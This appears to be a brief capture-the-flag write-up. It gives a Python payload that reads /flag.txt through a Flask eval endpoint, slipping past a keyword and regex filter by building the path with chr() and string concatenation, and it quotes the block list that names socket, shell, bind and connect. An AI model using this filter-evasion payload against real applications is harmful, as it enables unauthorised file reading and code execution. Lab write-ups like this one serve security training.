```python
open(chr(47) + "flag." +"t" + "x" + "t").read()
```

Final exploit above. Regex pattern was in comments 

```
    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
```

Basically can't use "/" or "\" and ".txt" is not allowed. Got around this with python string concatenation and the "chr" function.